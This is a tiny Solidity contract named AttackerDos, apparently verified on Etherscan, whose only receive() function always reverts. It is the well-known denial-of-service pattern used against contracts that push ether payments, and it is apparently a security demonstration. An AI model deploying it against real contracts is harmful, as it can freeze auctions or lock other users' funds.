/**
 *Submitted for verification at Etherscan.io on 2022-01-04
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.6;

contract AttackerDos {
    
    receive() external payable {
        revert();
    }
}